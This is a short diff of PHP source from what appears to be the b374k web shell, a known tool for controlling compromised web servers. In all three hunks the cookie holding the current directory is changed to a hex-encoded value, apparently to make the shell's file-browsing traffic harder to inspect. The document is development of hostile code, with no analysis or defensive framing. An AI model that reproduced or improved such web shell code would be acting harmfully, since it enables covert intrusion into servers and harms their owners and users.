@@ -17,7 +17,7 @@ if(isset($p['viewEntry'])){
 	$path = trim($p['viewEntry']);
 	if(is_file($path)){
 		$dirname = realpath(dirname($path)).DIRECTORY_SEPARATOR;
-		setcookie("cwd", $dirname);
+		setcookie("cwd", bin2hex($dirname));
 		chdir($dirname);
 		$nav = get_nav($dirname);
 		$cwd = html_safe($dirname);
@@ -25,7 +25,7 @@ if(isset($p['viewEntry'])){
 	}
 	elseif(is_dir($path)){
 		$path = realpath($path).DIRECTORY_SEPARATOR;
-		setcookie("cwd", $path);
+		setcookie("cwd", bin2hex($path));
 		chdir($path);
 		$nav = get_nav($path);
 		$cwd = html_safe($path);
@@ -89,7 +89,7 @@ if(isset($p['cd'])){
 	if(is_dir($path)){
 		chdir($path);
 		$path = $path.DIRECTORY_SEPARATOR;
-		setcookie("cwd", $path);
+		setcookie("cwd", bin2hex($path));
 		$res = $path."{[|b374k|]}".get_nav($path)."{[|b374k|]}";
 		if(isset($p['showfiles'])&&($p['showfiles']=='true')){
 			$res .= show_all_files($path);
